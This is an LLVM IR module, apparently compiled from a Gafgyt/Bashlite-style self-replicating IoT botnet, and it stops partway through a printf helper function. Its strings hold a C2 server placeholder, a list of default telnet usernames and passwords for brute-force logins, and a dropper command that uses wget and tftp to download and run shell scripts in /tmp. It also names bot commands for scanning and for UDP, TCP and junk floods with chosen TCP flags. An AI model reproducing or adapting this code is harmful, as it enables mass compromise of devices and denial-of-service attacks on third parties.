; ModuleID = 'host/ir_O0/Selfrep.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [8 x i8] c"IP:PORT\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0)], align 16
@.str.7 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.75 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.16 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.19 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.23 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.24 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@.str.25 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.26 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.28 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [181 x i8] c"cd /tmp || cd /var/run;wget http://ip/wbin.sh;sh wbin.sh;rm -rf wbin.sh;tftp -r tbin1.sh -g ip;sh tbin1.sh; tftp ip -c get tbin2.sh; sh tbin2.sh; rm -rf tbin1.sh tbin2.sh wbin.sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [10 x i8] c"ulti-call\00", align 1
@.str.33 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.36 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.37 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.40 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.43 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.44 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.45 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.46 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.47 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.48 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.49 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.50 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.52 = private unnamed_addr constant [6 x i8] c"FORK\0A\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.54 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.56 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.58 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.59 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.61 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.62 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.63 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.64 = private unnamed_addr constant [9 x i8] c"[cpuset]\00", align 1
@.str.65 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.66 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.67 = private unnamed_addr constant [19 x i8] c"FAILED TO CONNECT\0A\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.69 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.70 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.71 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.72 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.73 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"LINK CLOSED\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %286

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %275

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

; <label>:111:                                    ; preds = %101
  br label %112

; <label>:112:                                    ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

; <label>:119:                                    ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

; <label>:136:                                    ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

; <label>:141:                                    ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

; <label>:149:                                    ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

; <label>:166:                                    ; preds = %154
